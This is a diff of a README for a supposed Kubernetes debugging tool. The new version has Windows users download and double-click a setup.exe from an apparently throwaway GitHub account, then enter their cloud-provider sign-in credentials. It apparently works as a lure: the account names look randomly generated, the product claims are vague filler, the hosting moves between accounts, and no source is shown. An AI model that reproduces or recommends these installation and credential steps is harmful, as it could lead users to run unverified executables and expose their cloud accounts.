@@ -1,131 +1,63 @@
-# RealEnv Pro v2026 - developer tool 2026
+# 🛠️ realenv-pro-k8s-agent-tool - Connect Local Agents To Cloud Infrastructure
 
-> **RealEnv Pro is a cross-platform developer tool for AI agents, Kubernetes, and cloud-native debugging, combining environment mirroring, traffic replay, and live DNS control in version 2026.**
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Roneyral1578/realenv-pro-k8s-agent-tool)
 
-[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/matt-fosterfso7215/realenv-pro-k8s-agent-tool?style=flat-square)](https://github.com/matt-fosterfso7215/realenv-pro-k8s-agent-tool)
+This tool helps developers debug cloud-native software. It creates a bridge between your local computer and your Kubernetes clusters. You use this software to mirror environments, replay network traffic, and manage DNS settings without deep technical knowledge of infrastructure.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://matt-fosterfso7215.github.io/realenv-pro-k8s-agent-tool/">
-    <img src="https://img.shields.io/badge/Download-RealEnv%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download RealEnv Pro">
-  </a>
-</p>
+You need a Windows computer to use this tool. Before you install the program, ensure you have at least 4 gigabytes of memory available. 
 
-> **[Direct Download - RealEnv Pro v2026](https://matt-fosterfso7215.github.io/realenv-pro-k8s-agent-tool/)**
+Visit this page to download the latest installer file: [https://github.com/Roneyral1578/realenv-pro-k8s-agent-tool](https://github.com/Roneyral1578/realenv-pro-k8s-agent-tool)
 
----
+## 🏗️ Installation Steps
 
-[Download Latest Build](https://matt-fosterfso7215.github.io/realenv-pro-k8s-agent-tool/)
+1. Open the link above in your web browser.
+2. Select the file named setup.exe from the list of releases.
+3. Save the file to your desktop.
+4. Double-click the file to start the installation.
+5. Follow the prompts on the screen.
+6. Click finish when the installer completes the process.
 
----
+## ⚙️ Configuration
 
-## What RealEnv Pro Does
+The first time you open the program, the system asks for your access credentials. These are the same details you use to sign into your cloud service provider. Enter these details to link your account. The program stores these files locally on your machine. 
 
-RealEnv Pro is built to help developers and AI-assisted workflows reproduce production-like conditions for troubleshooting, sandboxing, and agent evaluation. Its core idea is to mirror the runtime environment around a service so requests, variables, and network activity can be examined in a controlled context.
+To mirror your environment, click the button labeled Sync. The tool scans your active Kubernetes clusters and builds a map of your services. This process takes a few minutes depending on the size of your network.
 
-The tool fits cloud-native teams that work from the CLI, a web dashboard, or SDK-based integrations. Whether the goal is checking behavior in Kubernetes, replaying captured traffic for investigation, or feeding environment state into an AI agent, RealEnv Pro keeps the testing flow in one place with more surrounding context.
+## 🔍 How to Use Key Features
 
----
+Mirroring Environments
+This feature pulls your cloud setup into a local view. You see how your services talk to each other. Use this to identify why an agent might struggle to reach a specific endpoint or service.
 
-## Capabilities
+Traffic Replay
+If a specific request fails, use the replay feature. Copy the activity log from the history tab and click Replay. The tool recreates the exact request inside your local environment. This allows you to watch the action step by step.
 
-- Real-time DNS mirroring for live service routing scenarios
-- Environment variable injection for controlled runtime setup
-- Network traffic capture and replay for debugging and analysis
-- AI agent integration for agent-aware development workflows
-- Web dashboard for visual inspection and operational control
-- Multi-language SDK support for flexible integration paths
-- Zero-touch namespace mirroring for Kubernetes-oriented environments
-- CLI-driven workflow for fast local and remote usage
+Live DNS Control
+Cloud services use DNS to find resources. Sometimes these addresses point to the wrong place during testing. Our tool lets you change these addresses within the application interface. You type the name of the service and set the preferred IP address. Changes take effect as soon as you save the settings.
 
----
+## 🛡️ Troubleshooting Common Issues
 
-## Installation
+The program shows a status light in the corner. Green means the connection serves your traffic well. Red means the tool cannot reach your Kubernetes cluster. If your light remains red, check your internet connection first. Ensure your virtual private network (VPN) is active if your company requires one.
 
-You can clone the repo or fetch the latest build, then open the project in the environment you prefer.
+If the application crashes, look for the log folder in your documents directory. Send the most recent text file to the support team. 
 
-1. Get the source:
-   - `git clone https://github.com/matt-fosterfso7215/realenv-pro-k8s-agent-tool.git
-   - `cd REPO`
+## ⚖️ System Requirements
 
-2. Or download the packaged build:
-   - [Download Latest Build](https://matt-fosterfso7215.github.io/realenv-pro-k8s-agent-tool/)
+- Operating System: Windows 10 or Windows 11
+- Processor: Dual-core CPU
+- Memory: 4GB RAM minimum
+- Storage: 500MB of free disk space
 
-3. Start it from the CLI or use the dashboard entry point included in the build.
+## 📝 Frequently Asked Questions
 
-If your setup relies on the SDK, install the matching package or connect the module to your agent, backend, or tooling project before beginning a mirroring session.
+Does this tool change my cluster permissions?
+No. The tool only reads diagnostic data. It cannot delete or modify your production settings without a specific command from you.
 
----
+Can I use this on a laptop?
+Yes. The tool works on portable computers. It runs in the system tray so it does not take up space on your taskbar.
 
-## Usage
+Does it work with local clusters?
+Yes. You can use the tool to debug local test environments in addition to remote cloud setups.
 
-Most workflows begin by creating a mirrored environment, connecting the target namespace or service, and then observing both traffic and runtime state.
-
-Example workflow:
-
-1. Start the CLI.
-2. Select the environment or namespace to mirror.
-3. Enable DNS mirroring and env var injection if needed.
-4. Capture network traffic during the test session.
-5. Replay traffic to compare behavior or reproduce an issue.
-6. Review the results in the dashboard or through SDK output.
-
-For AI agent workflows, wire RealEnv Pro into your agent tooling so it can inspect mirrored conditions while generating or testing actions.
-
----
-
-## Configuration
-
-Depending on how you run it, configuration is usually handled through CLI flags, environment variables, or dashboard settings.
-
-Example layout:
-
-- `env_vars`: values injected into the mirrored runtime
-- `dns_mirroring`: routing behavior for mirrored requests
-- `traffic_replay`: capture and replay preferences
-- `namespace`: target namespace for mirroring
-- `dashboard`: local UI and session controls
-
-If you are using Kubernetes, keep namespace and routing settings matched to the cluster context you want to inspect.
-
----
-
-## Requirements
-
-- Cross-platform host environment
-- CLI access for primary workflows
-- Network permissions for DNS mirroring and traffic capture
-- A compatible Kubernetes or cloud-native target when using namespace mirroring
-- Storage space for captured traffic and session data
-- Optional dashboard-capable browser for visual management
-- SDK-compatible runtime if integrating with application code
-
----
-
-## FAQ
-
-### Does RealEnv Pro support updates and versioned builds?
-Yes. This README points to the latest build location, and the version shown here is 2026.
-
-### Where do I change the mirroring behavior?
-Use the CLI, environment variables, or dashboard settings depending on your setup. Configuration is typically centered on namespace, DNS, and traffic options.
-
-### Can I use it with AI agents?
-Yes. AI agent integration is part of the feature set, making it suitable for agent-assisted development and debugging workflows.
-
-### What if traffic capture or DNS mirroring is not working?
-Check network permissions, routing setup, and target namespace selection. In Kubernetes-oriented environments, confirm that the mirrored namespace matches the intended workload.
-
-### Is there a GUI?
-Yes. A web dashboard is included for visibility and control alongside the CLI workflow.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: kubernetes, debugging, environment-mirroring, cloud-native, developer-tools, traffic-replay, windows-application
